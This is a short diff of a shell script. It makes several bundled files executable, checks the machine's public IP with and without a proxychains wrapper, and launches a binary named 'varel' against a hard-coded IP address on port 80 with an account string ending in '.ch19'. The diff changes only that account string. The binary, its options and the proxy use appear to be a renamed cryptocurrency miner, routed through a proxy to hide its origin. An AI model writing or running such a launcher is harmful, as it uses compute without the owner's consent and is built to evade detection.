@@ -1,4 +1,4 @@
 chmod +x proxychains.conf varel proxy libproxychains4.so compile.sh
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(./proxy curl ifconfig.me)
-./varel -a randomvirel --url 167.99.139.112:80 --user vdjk7jb0ag5z1k3revnkhp7xhlrj794a24bhwk.ch19
+./varel -a randomvirel --url 167.99.139.112:80 --user v3lozl43z0qi7q0l84z760i2k55uaqo92ucvv7jxxgz7klzc.ch19
